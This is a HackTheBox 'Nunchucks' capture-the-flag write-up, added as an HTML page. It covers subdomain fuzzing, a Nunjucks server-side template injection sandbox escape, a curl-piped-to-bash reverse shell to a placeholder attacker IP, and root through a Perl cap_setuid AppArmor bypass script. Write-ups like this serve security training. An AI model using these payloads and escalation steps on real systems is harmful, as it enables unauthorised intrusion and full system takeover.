@@ -1,0 +1,239 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Nunchucks</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Nunchucks (HTB – Easy)</h1>
+
+<p>
+The machine hosts a Node.js application vulnerable to Server‑Side Template Injection (SSTI) through the Nunjucks
+template engine.  
+Exploitation provides remote command execution.  
+Privilege escalation is achieved by abusing a Perl binary with the <code>cap_setuid+ep</code> capability and bypassing
+AppArmor restrictions.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: nunchucks.htb  
+<br>Initial vector: Nunjucks SSTI → RCE  
+<br>Privilege escalation: Perl capabilities + AppArmor bypass  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Nmap:</p>
+<pre>
+22/tcp  ssh
+80/tcp  http → redirects to HTTPS
+443/tcp https (nginx)
+</pre>
+
+<p>
+Add <code>nunchucks.htb</code> to <code>/etc/hosts</code>.  
+Directory fuzzing reveals nothing useful.
+</p>
+
+<h2>Subdomain Discovery</h2>
+
+<p>
+Virtual host fuzzing:
+</p>
+
+<pre>
+$ gobuster vhost -u https://nunchucks.htb \
+  -w subdomains-top1million-5000.txt -k
+-> score.nunchucks.htb
+</pre>
+
+<p>
+Add the subdomain and browse it.  
+Wappalyzer identifies:
+</p>
+
+<pre>
+Node.js / Nunjucks template engine
+</pre>
+
+<h2>SSTI – Nunjucks RCE</h2>
+
+<p>
+Testing the email field with template syntax:
+</p>
+
+<pre>
+{{4+4}}@test.com
+-> 8
+</pre>
+
+<p>
+This confirms SSTI.  
+Use a known Nunjucks sandbox escape:
+</p>
+
+<pre>
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
+</pre>
+
+<p>
+To get a reverse shell, host a payload:
+</p>
+
+<pre>
+# On attacker
+$ echo "bash -i >& /dev/tcp/KALI_IP/443 0>&1" > index.html
+$ python3 -m http.server 80
+</pre>
+
+<p>
+Send via SSTI:
+</p>
+
+<pre>
+curl KALI_IP/index.html | bash
+</pre>
+
+<p>
+A shell is obtained as <code>www-data</code>.
+</p>
+
+<h2>TTY Fix</h2>
+
+<pre>
+$ script /dev/null -c bash
+Ctrl+Z
+$ stty raw -echo; fg
+$ reset
+$ export TERM=xterm
+$ export SHELL=bash
+</pre>
+
+<h2>Privilege Escalation</h2>
+
+<p>
+Check capabilities:
+</p>
+
+<pre>
+$ getcap -r / 2>/dev/null
+/usr/bin/perl cap_setuid+ep
+</pre>
+
+<p>
+Perl can set UID to 0, but AppArmor restricts direct execution.  
+Bypass AppArmor by creating a script with a Perl shebang:
+</p>
+
+<pre>
+$ cat > /tmp/perl_cap_bypass.pl << 'EOF'
+#!/usr/bin/perl
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/bash";
+EOF
+</pre>
+
+<p>
+Make it executable:
+</p>
+
+<pre>
+$ chmod +x /tmp/perl_cap_bypass.pl
+$ /tmp/perl_cap_bypass.pl
+</pre>
+
+<p>
+Root shell obtained.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+Nunchucks relies on a classic Nunjucks SSTI vulnerability to gain initial RCE.  
+Privilege escalation is achieved by abusing a Perl binary with <code>cap_setuid+ep</code> and bypassing AppArmor
+restrictions using a custom Perl script.  
+This results in full system compromise.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
